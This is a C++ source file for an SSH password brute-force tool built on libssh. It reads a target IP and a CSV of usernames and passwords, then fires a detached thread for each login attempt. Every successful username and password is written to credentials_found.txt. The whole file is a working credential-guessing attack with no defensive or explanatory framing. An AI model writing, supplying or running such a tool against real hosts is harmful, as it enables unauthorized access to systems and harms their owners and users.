#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <thread>
#include <vector>
#include <chrono>
#include <regex>
#include <libssh/libssh.h> // Install libssh library to use this

// Function to validate an IPv4 address
bool isValidIPAddress(const std::string& ipAddress) {
    std::regex ipv4Regex(
        R"((\d{1,3}\.){3}\d{1,3})"
    );
    if (!std::regex_match(ipAddress, ipv4Regex))
        return false;

    std::istringstream iss(ipAddress);
    std::string segment;
    while (std::getline(iss, segment, '.')) {
        int num = std::stoi(segment);
        if (num < 0 || num > 255)
            return false;
    }
    return true;
}

// Function to connect via SSH
void sshConnect(const std::string& host, const std::string& username, const std::string& password) {
    ssh_session session = ssh_new();
    if (session == nullptr) {
        std::cerr << "Failed to create SSH session.\n";
        return;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());

    if (ssh_connect(session) != SSH_OK) {
        std::cerr << "Error connecting to host: " << ssh_get_error(session) << "\n";
        ssh_free(session);
        return;
    }

    if (ssh_userauth_password(session, nullptr, password.c_str()) == SSH_AUTH_SUCCESS) {
        std::cout << "Username: " << username << ", Password: " << password << " - Success!\n";
        std::ofstream outfile("credentials_found.txt", std::ios::app);
        outfile << "Username: " << username << "\nPassword: " << password << "\nWorked on host: " << host << "\n";
        outfile.close();
    } else {
        std::cout << "Username: " << username << ", Password: " << password << " - Failed.\n";
    }

    ssh_disconnect(session);
    ssh_free(session);
}

// Function to read the host IP address
std::string getIPAddress() {
    std::string host;
    while (true) {
        std::cout << "Please enter the host IP address: ";
        std::cin >> host;

        if (isValidIPAddress(host)) {
            return host;
        } else {
            std::cout << "Invalid IP address. Try again.\n";
        }
    }
}

// Main function
void mainFunction() {
    std::string listFile = "passwords.csv";
    std::ifstream file(listFile);

    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << listFile << "\n";
        return;
    }

    std::string host = getIPAddress();
    std::string knownUsername;
    std::cout << "Do you know the username? (yes/no): ";
    std::string response;
    std::cin >> response;

    bool useKnownUsername = (response == "yes");

    if (useKnownUsername) {
        std::cout << "Enter the known username: ";
        std::cin >> knownUsername;
        std::cout << "Cracking passwords for username: " << knownUsername << "\n";

        std::string line, password;
        while (std::getline(file, line)) {
            std::istringstream ss(line);
            ss >> password; // Assuming passwords are in the first column
            std::thread t(sshConnect, host, knownUsername, password);
            t.detach();
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
    } else {
        std::cout << "Using usernames and passwords from the CSV file.\n";

        std::string line, username, password;
        while (std::getline(file, line)) {
            std::istringstream ss(line);
            std::getline(ss, username, ',');
            std::getline(ss, password, ',');

            std::thread t(sshConnect, host, username, password);
            t.detach();
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
    }
    file.close();
}

// Entry point
int main() {
    mainFunction();
    return 0;
}
